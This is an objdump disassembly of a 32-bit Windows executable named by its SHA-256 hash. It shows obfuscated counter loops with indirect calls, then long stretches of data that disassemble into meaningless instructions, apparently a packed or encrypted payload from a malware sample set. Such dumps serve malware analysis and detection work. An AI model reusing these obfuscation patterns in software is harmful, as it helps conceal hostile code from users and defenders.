
a92ee9856bfdf8494dc1f420f733a73bd77243dc62206b2f0fe389039f7f2499.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fc8d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fc89,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e09c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fc71,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fc59,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fc59
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fc59,ecx
  401068:	cmp    DWORD PTR ds:0x42fc59,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fc59,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e4a7
  401090:	cmp    DWORD PTR ds:0x42fc59,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fc59
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fc59,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e0a4,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e68b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e67b,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e67b,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e67b,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e0a8
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e24f
  401100:	cmp    DWORD PTR ds:0x42e67b,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e67b
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e67b,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e67b
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e67b,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e09c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e09c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e09c,esi
  401145:	cmp    DWORD PTR ds:0x42e09c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e4ab
  401160:	cmp    DWORD PTR ds:0x42e09c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e09c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e09c,esi
  40117c:	cmp    DWORD PTR ds:0x42e09c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e0b4,0x1a
  401193:	cmp    DWORD PTR ds:0x42e0b4,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e0b4,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fcfa
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd02
  4011bf:	push   0x17d1
  4011c4:	push   0x42e1a7
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e3cb
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e0b4
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e0b4,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e67b,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fc85
  4011f8:	adc    esi,DWORD PTR ds:0x42fc89
  4011fe:	mov    DWORD PTR ds:0x42fc85,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e683,0x17
  401216:	cmp    DWORD PTR ds:0x42e683,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e683,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e146
  401238:	push   0x42e0fd
  40123d:	call   DWORD PTR ds:0x42e4af
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e683
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e683,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fcfe,0x12
  40126b:	cmp    DWORD PTR ds:0x42fcfe,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fcfe,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e1a7
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e4b3
  4012a0:	mov    esi,DWORD PTR ds:0x42fcfe
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fcfe,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	and    eax,0x704657ab
  4012f8:	jo     0x40136a
  4012fa:	jo     0x40136c
  4012fc:	jle    0x40136e
  4012fe:	jo     0x4012c0
  401300:	xlat   BYTE PTR ds:[ebx]
  401301:	cmp    eax,0xcfd339d5
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	lahf   
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	pop    ecx
  4013a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a9:	jae    0x4013c8
  4013ab:	dec    ecx
  4013ac:	mov    esi,0x41fb26cf
  4013b1:	aad    0x19
  4013b3:	add    edi,DWORD PTR [edi]
  4013b5:	cmp    BYTE PTR [edx+edi*1+0x7a2aa44],ah
  4013bc:	cmp    BYTE PTR [edi+0x0],al
  4013bf:	mov    ah,0x15
  4013c1:	jle    0x401357
  4013c3:	inc    edx
  4013c4:	inc    esp
  4013c5:	pop    esi
  4013c6:	int    0xf6
  4013c8:	xchg   edi,eax
  4013c9:	addr16 xchg si,ax
  4013cc:	pop    es
  4013cd:	pop    ebx
  4013ce:	xchg   ebx,eax
  4013cf:	sbb    ebp,DWORD PTR [eax+0x1b]
  4013d2:	not    BYTE PTR [edx]
  4013d4:	sahf   
  4013d5:	addr16 mov ch,0xe
  4013d8:	ficom  WORD PTR ss:[ebp+0x5e]
  4013dc:	jns    0x401401
  4013de:	jg     0x40137e
  4013e0:	outs   dx,BYTE PTR ds:[esi]
  4013e1:	shr    DWORD PTR [edx+0x3],cl
  4013e4:	adc    eax,0xa81d395e
  4013e9:	adc    DWORD PTR [edx],ebx
  4013eb:	mov    ecx,0x3ca1dc05
  4013f0:	add    al,BYTE PTR [edi+0x4e15d157]
  4013f6:	aam    0xd4
  4013f8:	push   es
  4013f9:	push   ss
  4013fa:	fs pop ecx
  4013fc:	and    DWORD PTR [ebp+0x6c],edi
  4013ff:	xchg   esi,eax
  401400:	lock retf 
  401402:	cmc    
  401403:	jnp    0x4013d7
  401405:	mov    WORD PTR [edi-0x22],?
  401408:	test   DWORD PTR [eax-0x80],ebp
  40140b:	stos   BYTE PTR es:[edi],al
  40140c:	jbe    0x4013d3
  40140e:	cmp    ah,ah
  401410:	cmc    
  401411:	lds    eax,FWORD PTR [ebp+eiz*2-0x7a660de1]
  401418:	inc    edi
  401419:	lahf   
  40141a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40141b:	sub    BYTE PTR [ecx+0x6b82d685],bl
  401421:	idiv   BYTE PTR [esp+edi*4+0x2a]
  401425:	xchg   esi,eax
  401426:	jg     0x401434
  401428:	jmp    0xa2652a97
  40142d:	ja     0x401461
  40142f:	gs popf 
  401431:	fst    QWORD PTR [ebx-0x29f9d710]
  401437:	out    dx,al
  401438:	jbe    0x401414
  40143a:	mov    ecx,0x99b8c4ee
  40143f:	test   eax,0xf469ceb3
  401444:	mov    ds:0xdfc05c1b,al
  401449:	popa   
  40144a:	cmp    BYTE PTR [edx+0x52],dl
  40144d:	cdq    
  40144e:	dec    edx
  40144f:	stc    
  401450:	sub    esi,esp
  401452:	jmp    0x334e7c83
  401457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401458:	fs clc 
  40145a:	cmp    BYTE PTR [esi],bl
  40145c:	push   esi
  40145d:	adc    ch,BYTE PTR [edi+0x3510f3f]
  401463:	mov    al,ds:0x8b9190c
  401468:	dec    eax
  401469:	pop    edx
  40146a:	(bad)  
  40146b:	mov    dh,0x75
  40146d:	dec    esp
  40146e:	das    
  40146f:	sbb    al,0x47
  401471:	stos   BYTE PTR es:[edi],al
  401472:	jb     0x40145c
  401474:	add    edx,DWORD PTR [ecx]
  401476:	mov    edx,0x1707e5a1
  40147b:	xchg   esi,eax
  40147c:	repz or eax,0x46860dda
  401482:	dec    edi
  401483:	pop    ecx
  401484:	or     al,0x26
  401486:	mov    bh,0xb
  401488:	mov    gs,esp
  40148a:	lods   al,BYTE PTR ds:[esi]
  40148b:	jmp    0x2d0647ee
  401490:	stos   BYTE PTR es:[edi],al
  401491:	push   ebx
  401492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401493:	out    dx,al
  401494:	xchg   ecx,eax
  401495:	lahf   
  401496:	aaa    
  401497:	stos   DWORD PTR es:[edi],eax
  401498:	ins    DWORD PTR es:[edi],dx
  401499:	jle    0x401497
  40149b:	pushf  
  40149c:	sar    DWORD PTR [ebx+0x71],0xcf
  4014a0:	mov    ss,esi
  4014a2:	loop   0x40148f
  4014a4:	dec    edx
  4014a5:	mov    ecx,0x2d8cd5a4
  4014aa:	(bad)  
  4014ab:	stos   DWORD PTR es:[edi],eax
  4014ac:	sbb    edi,DWORD PTR [ecx]
  4014ae:	mov    cl,0x4e
  4014b0:	test   DWORD PTR [edx+0x6c],0x2aebbc4
  4014b7:	or     al,0x27
  4014b9:	push   edx
  4014ba:	dec    edx
  4014bb:	outs   dx,BYTE PTR fs:[esi]
  4014bd:	lods   eax,DWORD PTR ds:[esi]
  4014be:	into   
  4014bf:	and    eax,0x5c5b5ae2
  4014c4:	repnz into 
  4014c6:	xchg   esi,eax
  4014c7:	xchg   BYTE PTR [ecx],ch
  4014c9:	mov    ds:0x3e3bfdda,eax
  4014ce:	sahf   
  4014cf:	call   0xaad:0xa1959e78
  4014d6:	dec    ebx
  4014d7:	cmp    al,BYTE PTR [esi+0x148da71]
  4014dd:	mov    al,0xfc
  4014df:	popa   
  4014e0:	sub    bl,ch
  4014e2:	stos   DWORD PTR es:[edi],eax
  4014e3:	int    0xde
  4014e5:	dec    esi
  4014e6:	xchg   edx,eax
  4014e7:	cmp    dl,0xbc
  4014ea:	add    BYTE PTR [edi],al
  4014ec:	xor    bl,ah
  4014ee:	lods   eax,DWORD PTR ds:[esi]
  4014ef:	ficom  DWORD PTR [ecx-0x3b]
  4014f2:	lds    edx,FWORD PTR [esi]
  4014f4:	push   eax
  4014f5:	pop    edx
  4014f6:	cmp    dl,BYTE PTR [ecx]
  4014f8:	in     al,dx
  4014f9:	jo     0x4014a3
  4014fb:	call   edi
  4014fd:	jp     0x401511
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x69bee013]
  401516:	push   edi
  401517:	push   DWORD PTR [eax+0x7e]
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	xchg   ebp,ecx
  401522:	js     0x401572
  401524:	clc    
  401525:	fsubr  QWORD PTR [esi-0x54]
  401528:	or     cl,BYTE PTR [eax+0x61f9b485]
  40152e:	inc    eax
  40152f:	xor    ch,al
  401531:	pushf  
  401532:	cld    
  401533:	sbb    al,0x65
  401535:	rcl    DWORD PTR [ebp-0x7a],cl
  401538:	not    BYTE PTR [ecx+0x27e2631b]
  40153e:	mov    ecx,0x376493a8
  401543:	xchg   DWORD PTR [esi-0x66],esp
  401546:	fs out 0xe2,eax
  401549:	and    BYTE PTR [eax],0x5f
  40154c:	jmp    0x4015c7
  40154e:	pop    edx
  40154f:	mov    BYTE PTR [edi-0x225bf82],ch
  401555:	fucom  st(6)
  401557:	sahf   
  401558:	cmp    esp,esp
  40155a:	aaa    
  40155b:	pushf  
  40155c:	ins    DWORD PTR es:[edi],dx
  40155d:	jecxz  0x4015cc
  40155f:	push   0x25c01cf7
  401564:	cmp    BYTE PTR [edx+0xd],dl
  401567:	add    BYTE PTR [ebx-0x7a],al
  40156a:	clc    
  40156b:	fidivr WORD PTR [edi-0x1370804d]
  401571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401572:	imul   eax,esp,0xffffff9f
  401575:	xchg   edi,eax
  401576:	adc    al,0x3a
  401578:	stc    
  401579:	cmp    al,bh
  40157b:	in     al,0x61
  40157d:	inc    ebx
  40157e:	enter  0xd9b4,0xc7
  401582:	add    al,0x55
  401584:	jno    0x401549
  401586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401587:	push   esi
  401588:	cs and eax,0x50338666
  40158e:	mov    esp,0x77e5c2ae
  401593:	ficomp WORD PTR ds:0xecc09853
  401599:	gs aad 0xa3
  40159c:	dec    ebx
  40159d:	stos   DWORD PTR es:[edi],eax
  40159e:	or     eax,0xaf92e564
  4015a3:	into   
  4015a4:	jl     0x401562
  4015a6:	pop    esp
  4015a7:	sbb    bl,BYTE PTR [edi]
  4015a9:	xchg   ebx,eax
  4015aa:	stos   DWORD PTR es:[edi],eax
  4015ab:	jmp    0x1bc1:0x383cb3b1
  4015b2:	(bad)  
  4015b3:	xor    ebx,DWORD PTR [eax]
  4015b5:	jecxz  0x401625
  4015b7:	mov    esp,0xc09df653
  4015bc:	fwait
  4015bd:	adc    al,0x6b
  4015bf:	push   edi
  4015c0:	xchg   esp,eax
  4015c1:	arpl   WORD PTR [ebx+ecx*1-0xab3075f],bp
  4015c8:	push   ecx
  4015c9:	jl     0x4015bc
  4015cb:	adc    eax,0x1e7b419d
  4015d0:	nop
  4015d1:	mov    al,0xfb
  4015d3:	inc    eax
  4015d4:	mov    ds:0x8d6fc5d4,al
  4015d9:	adc    eax,0xbdd6bc23
  4015de:	push   ebx
  4015df:	or     ebp,DWORD PTR [edi+ebp*2+0x2f75cb]
  4015e6:	push   edi
  4015e7:	jmp    0x401625
  4015e9:	out    0xa7,al
  4015eb:	mov    esp,0x6deebe20
  4015f0:	add    eax,0x11e8a030
  4015f5:	adc    ch,al
  4015f7:	xor    eax,0x28a87108
  4015fc:	outs   dx,DWORD PTR ds:[esi]
  4015fd:	rcl    ebp,cl
  4015ff:	cmp    al,0xa0
  401601:	sub    BYTE PTR [ebp+0x21],bl
  401604:	iret   
  401605:	xor    eax,0xb99006dd
  40160a:	nop
  40160b:	popf   
  40160c:	jmp    0x7fb7fb9b
  401611:	lea    ecx,[ebp+eax*1-0x5c]
  401615:	(bad)  
  401617:	mov    dh,0xb8
  401619:	jecxz  0x4015e8
  40161b:	(bad)  [ebx-0x3]
  40161e:	mov    ch,0x8
  401620:	js     0x4015cd
  401622:	rol    DWORD PTR [ebp-0x6e29da2c],cl
  401628:	inc    eax
  401629:	xchg   esp,eax
  40162a:	repnz in al,0xe5
  40162d:	push   ss
  40162e:	lea    eax,[edx-0x5f74ff4a]
  401634:	not    bh
  401636:	rcr    esp,1
  401638:	imul   esp,DWORD PTR [ecx],0x17
  40163b:	and    BYTE PTR [esi],ch
  40163d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40163e:	mov    bh,0xa0
  401640:	shld   DWORD PTR [ebp-0x41],ecx,0x2e
  401645:	push   edx
  401646:	push   edx
  401647:	mov    eax,ds:0x49e1db62
  40164c:	inc    esi
  40164d:	jle    0x40162f
  40164f:	add    dl,dl
  401651:	iret   
  401652:	loopne 0x401636
  401654:	pop    ds
  401655:	xchg   BYTE PTR [eax-0x42],dh
  401658:	dec    ebx
  401659:	test   al,0x64
  40165b:	and    DWORD PTR [edi-0x11],esp
  40165e:	sar    BYTE PTR [ecx-0x9],0xb2
  401662:	ss pusha 
  401664:	push   0x28
  401666:	ds pop edi
  401668:	imul   esi,ebp,0xffffffb8
  40166b:	test   DWORD PTR [edx+0x4c],0x3b37be9
  401672:	xlat   BYTE PTR ds:[ebx]
  401673:	dec    esp
  401674:	xchg   ecx,eax
  401675:	in     eax,0x60
  401677:	pop    ds
  401678:	xchg   ebx,eax
  401679:	xchg   ebx,eax
  40167a:	mov    ebp,0x580ba58d
  40167f:	add    ebp,DWORD PTR [edi+0x517359ba]
  401685:	add    edi,DWORD PTR [eax+ebp*2-0x3a]
  401689:	and    al,0x79
  40168b:	loopne 0x401679
  40168d:	mov    dh,0x86
  40168f:	or     BYTE PTR [edx+edi*4],al
  401692:	test   al,0xaa
  401694:	ret    0x67eb
  401697:	pushf  
  401698:	add    BYTE PTR [eax],ah
  40169a:	aad    0xd7
  40169c:	cmp    ch,bh
  40169e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40169f:	iret   
  4016a0:	and    al,0xd0
  4016a2:	mov    dh,0x3
  4016a4:	ret    
  4016a5:	popa   
  4016a6:	add    eax,0xdef8259f
  4016ab:	outs   dx,DWORD PTR ds:[esi]
  4016ac:	cwde   
  4016ad:	mov    ebp,0xa9927211
  4016b2:	mov    al,0x12
  4016b4:	pop    es
  4016b5:	sub    edi,DWORD PTR cs:[edx-0x3b]
  4016b9:	(bad)  
  4016ba:	mov    ebx,0xe9f3b12b
  4016bf:	or     ah,bl
  4016c1:	repz (bad) 
  4016c3:	push   cs
  4016c4:	shr    BYTE PTR [eax-0x61],0x21
  4016c8:	push   edi
  4016c9:	jmp    0x11f1c628
  4016ce:	add    BYTE PTR [ebx+esi*2-0x5036b3af],ah
  4016d5:	sub    eax,0x33705ae5
  4016da:	mov    eax,ds:0xb64198c6
  4016df:	out    dx,eax
  4016e0:	jmp    0x401758
  4016e2:	cli    
  4016e3:	aas    
  4016e4:	add    BYTE PTR [esi],al
  4016e6:	cmp    al,BYTE PTR [edx-0x7aa5e8fd]
  4016ec:	cld    
  4016ed:	loope  0x401727
  4016ef:	test   DWORD PTR [edi-0x22],ebx
  4016f2:	in     al,0xeb
  4016f4:	daa    
  4016f5:	cmp    DWORD PTR [edi],ebp
  4016f7:	push   esi
  4016f8:	test   ebp,edx
  4016fa:	mov    cl,0xa7
  4016fc:	in     eax,dx
  4016fd:	jp     0x40173c
  4016ff:	in     al,dx
  401700:	popf   
  401701:	in     eax,dx
  401702:	sbb    DWORD PTR [edx-0x54e2707b],eax
  401708:	xor    BYTE PTR [edi],cl
  40170a:	pop    ecx
  40170b:	push   0x3a
  40170d:	mov    eax,DWORD PTR [esi-0x6a6da34b]
  401713:	test   esp,ecx
  401715:	bound  esi,QWORD PTR [ebx-0x41]
  401718:	push   0x3a1484c0
  40171d:	(bad)  
  40171e:	pop    di
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	fisub  DWORD PTR [edi+0x74]
  401743:	popf   
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	push   0xc3c04f1d
  401751:	ret    0x4d1a
  401754:	cmp    al,0x36
  401756:	pop    ecx
  401757:	cmp    eax,0x8751ac5
  40175c:	xchg   edi,eax
  40175d:	cmp    BYTE PTR [ecx+ebp*2],bl
  401760:	pop    ecx
  401761:	push   eax
  401762:	outs   dx,BYTE PTR ds:[esi]
  401763:	(bad)  
  401764:	out    dx,al
  401765:	std    
  401766:	into   
  401767:	scas   al,BYTE PTR es:[edi]
  401768:	dec    eax
  401769:	into   
  40176a:	into   
  40176b:	rol    BYTE PTR [eax],0x56
  40176e:	xchg   ebx,eax
  40176f:	push   ss
  401770:	in     al,0xa2
  401772:	in     al,0xff
  401774:	ja     0x40174e
  401776:	inc    ebx
  401777:	aas    
  401778:	dec    ebx
  401779:	mov    ecx,DWORD PTR [ecx+0xfb459ae]
  40177f:	push   ecx
  401780:	xchg   ebp,eax
  401781:	sbb    ebx,DWORD PTR [ecx]
  401783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401784:	adc    esi,DWORD PTR [ecx-0xc]
  401787:	mov    ebp,0x9befe538
  40178c:	mov    ah,0x74
  40178e:	xchg   ebp,eax
  40178f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401790:	cli    
  401791:	pusha  
  401792:	mov    ecx,0x9e281c12
  401797:	mov    ah,0xe
  401799:	out    0x0,al
  40179b:	aaa    
  40179c:	or     esp,DWORD PTR [edx+0x7f4ef7a0]
  4017a2:	push   ecx
  4017a3:	xchg   cl,ch
  4017a5:	mov    ebp,0xe2fce8dc
  4017aa:	rcl    BYTE PTR [ebp+0x44],cl
  4017ad:	lock xchg edi,eax
  4017af:	jecxz  0x4017ee
  4017b1:	cli    
  4017b2:	fwait
  4017b3:	int    0xb0
  4017b5:	push   ds
  4017b6:	inc    esp
  4017b7:	or     al,0x64
  4017b9:	int    0x29
  4017bb:	cld    
  4017bc:	dec    ebx
  4017bd:	les    esp,FWORD PTR [ebp+0x37]
  4017c0:	test   al,0xd6
  4017c2:	not    DWORD PTR [ebp+esi*2-0x25]
  4017c6:	push   ss
  4017c7:	(bad)  
  4017c8:	out    0xa,eax
  4017ca:	inc    ebx
  4017cb:	push   esp
  4017cc:	aam    0x46
  4017ce:	ret    0x9e28
  4017d1:	jns    0x4017bf
  4017d3:	scas   al,BYTE PTR es:[edi]
  4017d4:	ficom  WORD PTR [eax]
  4017d6:	lea    eax,[ecx]
  4017d8:	dec    ebx
  4017d9:	cmp    al,BYTE PTR [edx+ebx*4+0x1423f172]
  4017e0:	mov    DWORD PTR [eax+0x68a420f2],ecx
  4017e6:	bound  ebp,QWORD PTR [ecx-0x417f6247]
  4017ec:	ds cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4017ef:	xor    BYTE PTR [eax-0x5ae2d707],ah
  4017f5:	cli    
  4017f6:	cdq    
  4017f7:	jnp    0x4017cc
  4017f9:	neg    BYTE PTR [ebp+0x640005ee]
  4017ff:	mov    al,ah
  401801:	js     0x401842
  401803:	and    al,0x27
  401805:	clc    
  401806:	call   0x6324b46f
  40180b:	not    BYTE PTR [ecx]
  40180d:	clc    
  40180e:	push   es
  40180f:	aam    0xcb
  401811:	inc    edx
  401812:	jmp    0xcfe4:0xd3b3682b
  401819:	or     DWORD PTR [ebx],edi
  40181b:	cs mov esi,edx
  40181e:	enter  0xb92,0x64
  401822:	leave  
  401823:	cmp    ch,BYTE PTR [edx]
  401825:	dec    edx
  401826:	inc    esi
  401827:	jo     0x40187b
  401829:	popa   
  40182a:	loop   0x40189e
  40182c:	in     al,0x4c
  40182e:	das    
  40182f:	leave  
  401830:	mov    DWORD PTR [ecx],esi
  401832:	popf   
  401833:	mov    ds:0x695a2829,eax
  401838:	outs   dx,DWORD PTR ds:[esi]
  401839:	pop    ss
  40183a:	xor    ebx,DWORD PTR [eax]
  40183c:	fmul   DWORD PTR [esi+edx*2+0x6ea40b29]
  401843:	loopne 0x4017f9
  401845:	cmp    ebx,DWORD PTR [edi+0x5928f2ff]
  40184b:	or     dh,BYTE PTR [esi-0xe]
  40184e:	push   es
  40184f:	mov    esi,0x3abba84b
  401854:	cld    
  401855:	mov    ds:0x85bde6de,al
  40185a:	dec    ecx
  40185b:	into   
  40185c:	retf   0x8629
  40185f:	xchg   edx,eax
  401860:	pop    esi
  401861:	push   edx
  401862:	xor    DWORD PTR [edi-0x54],ebx
  401865:	mov    al,ds:0xccdd76f3
  40186a:	mov    dl,0x9a
  40186c:	sub    al,0x56
  40186e:	test   al,0x14
  401870:	jns    0x4018d7
  401872:	mov    esp,0x2a7e302c
  401877:	push   es
  401878:	jmp    FWORD PTR [ebx+0x63e6b390]
  40187e:	ss xchg ecx,eax
  401880:	jb     0x4018ad
  401882:	inc    eax
  401883:	xor    ebx,DWORD PTR [eax+0x27]
  401886:	adc    esi,edx
  401888:	icebp  
  401889:	lds    esi,FWORD PTR [ebp+0x6d]
  40188c:	out    0x68,eax
  40188e:	in     eax,dx
  40188f:	xor    ecx,DWORD PTR [ebx]
  401891:	mov    esi,0x4ab8cdc8
  401896:	(bad)  
  401898:	lds    edx,FWORD PTR [ebx+0x48]
  40189b:	(bad)  
  40189c:	sub    eax,0xe1ac5fe9
  4018a1:	mov    ds:0x7f6d59cd,eax
  4018a6:	jo     0x401905
  4018a8:	or     ch,BYTE PTR [ebp+0x18]
  4018ab:	leave  
  4018ac:	mov    DWORD PTR [ebx-0x38d19fc0],eax
  4018b2:	or     dl,BYTE PTR [esi]
  4018b4:	xchg   ebp,eax
  4018b5:	js     0x4018a3
  4018b7:	mov    cl,0x30
  4018b9:	pusha  
  4018ba:	jmp    0x5fd2b979
  4018bf:	retf   0xa8e
  4018c2:	loope  0x401908
  4018c4:	scas   al,BYTE PTR es:[edi]
  4018c5:	or     ah,BYTE PTR ds:0x30813d57
  4018cb:	icebp  
